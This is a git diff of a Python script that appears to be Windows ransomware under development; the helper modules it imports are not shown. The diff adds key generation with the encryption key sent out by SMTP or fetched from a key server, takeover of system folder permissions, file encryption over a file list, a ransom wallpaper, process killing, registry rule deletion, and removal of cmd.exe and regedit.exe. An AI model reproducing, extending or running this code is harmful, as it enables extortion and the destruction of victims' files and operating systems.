@@ -1,42 +1,47 @@
 #!/usr/bin/python
 #coding:utf-8
 from cryptography.fernet import Fernet
-from modules.crypt import encrypt_function
+from modules.crypt import crypt
 from modules.permission import takeown, icacls, get_admin_rights
 from modules.system import killproc, regedit, set_wallpaper
+from modules.network import host_connect, sendkey_smtp, keyserver
 import os, sys, socket, wget, struct, ctypes, shutil, winreg, time, ctypes
 
-# Function to test if admin
-def is_admin():
-    try:
-        return ctypes.windll.shell32.IsUserAnAdmin()
-    except:
-        return False
-
-if is_admin():
-    encrypt_function.connect()
-    takeown.tkOwn_process()
-    icacls.icc_powershell()
-    icacls.icc_sys32()
-    killproc.pkill_smart()
-    icacls.remove_proc()
-    # ERROR -> la fonction appelé retourne une erreur, car elle fait référence a une variable présente dans une autre fonction du meme module
-    encrypt_function.filelist()
-    try:
-        path = os.getcwd()
-        img = "\setup\image.jpg"
-        Wallpaper = "%s%s" %(path, img)
-        filePath = shutil.copy(Wallpaper, '\\PerfLogs\\image.jpg')
-        SPI_SETDESKWALLPAPER = 20
-        WALLPAPER_PATH = '\\PerfLogs\\image.jpg'
+def get_sys_parameters_info():
+    # Based on if this is 32bit or 64bit returns correct version of SystemParametersInfo function
+    return ctypes.windll.user32.SystemParametersInfoW if is_64_windows() \
+        else ctypes.windll.user32.SystemParametersInfoA
+        
+usr = os.environ["USERNAME"]
+if(get_admin_rights.is_admin()):
+    if host_connect.keyrcv():
+        keyserver.getcrypt()
+    else:
+        crypt.genkey(usr)
+        sendkey_smtp.send_key()
+        takeown.tkOwn_process()
+        takeown.tkOwn_DirWallpaper()
+        takeown.tkOwn_IexploreDir()
+        takeown.tkOwn_regexp()
+        icacls.icc_iexdir()
+        icacls.icc_regexp()
+        icacls.icc_powershell()
+        icacls.icc_sys32()
+        set_wallpaper.copy_img()
+        crypt.filelist()
         set_wallpaper.change_wallpaper()
-    except:
-        pass
-    encrypt_function.filelist_aux()
-    regedit.delSpecRules()
-    regedit.delRules()
-    # Delete cmd.exe last because he used for running the program
-    os.remove("\\windows\\system32\\cmd.exe")
+        killproc.pkill_smart()
+        killproc.pkill_exp()
+        icacls.remove_proc()
+        crypt.filelist_aux()
+        regedit.delSpecRules()
+        regedit.delRules()
+        # Delete cmd.exe last because he used for running the program
+        os.remove("\\windows\\system32\\cmd.exe")
+        rmkey = "\\..\\%s.key" %(usr)
+        os.remove(usr)
+        os.remove("\\windows\\regedit.exe")
+
 else:
     print("Or restart the program with Admin permission")
     # Re-run the program with admin rights
